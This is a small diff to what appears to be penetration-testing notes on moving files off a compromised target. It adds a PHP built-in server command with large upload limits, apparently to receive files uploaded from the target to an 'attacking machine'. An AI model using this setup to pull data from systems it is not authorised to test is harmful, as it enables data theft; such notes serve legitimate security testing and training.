@@ -75,7 +75,10 @@ put file.zip
 This will upload the file.zip on our own attacking machine from the target machine. 
 
 
-
+## Host the above php file
+```
+ sudo php -d post_max_size=200M -d upload_max_filesize=200M -d memory_limit=512M -S 0.0.0.0:8000
+```
 
 
 
